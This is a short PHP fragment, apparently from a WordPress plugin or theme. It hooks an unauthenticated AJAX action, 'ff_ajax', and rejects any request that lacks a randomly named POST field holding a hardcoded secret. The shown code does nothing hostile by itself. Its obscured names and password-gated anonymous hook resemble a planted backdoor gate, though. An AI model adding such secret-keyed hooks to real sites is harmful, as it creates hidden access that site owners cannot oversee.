<?php

function emails_system_author() {
	if (!isset($_POST["txdixqcthdag"]) || $_POST["txdixqcthdag"] !== "yyIbARnq") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'emails_system_author', 5, 1);
